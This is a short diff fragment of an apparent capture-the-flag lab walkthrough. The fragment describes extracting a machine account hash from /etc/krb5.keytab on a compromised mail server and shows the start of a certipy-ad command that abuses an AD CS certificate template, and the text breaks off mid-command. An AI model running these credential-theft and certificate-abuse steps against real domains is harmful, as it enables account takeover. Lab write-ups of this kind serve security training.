@@ -142,8 +142,8 @@ now we need a computer cred, looks like we can run any command as root on mail01
 
 download /etc/krb5.keytab and extract mail01$ hash
 
+![](walkthrough_20240410161117503.png)
 
-![](walkthrough_20240410155319886.png)
 
 ```bash
 certipy-ad req -u 'mail01$'@hybrid.vl -hashes ':$hash' -c 'hybrid-DC01-CA' -target "$t1" -template 'HybridComputers' -upn 'adm
